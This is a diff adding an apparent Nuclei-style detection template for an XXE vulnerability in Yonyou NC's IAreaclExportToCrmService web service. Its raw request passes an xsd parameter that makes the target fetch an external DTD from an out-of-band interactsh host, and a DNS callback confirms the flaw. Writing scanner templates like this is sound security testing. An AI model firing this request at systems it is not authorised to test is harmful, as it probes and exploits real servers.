@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-nc-iareaclexporttocrmservice-xxe
+info:
+  name: "用友 NC IAreaclExportToCrmService XXE 漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: yongyou-nc
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.bd.crm.IAreaclExportToCrmService?xsd=http://{{interactsh-url}}/ext.dtd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
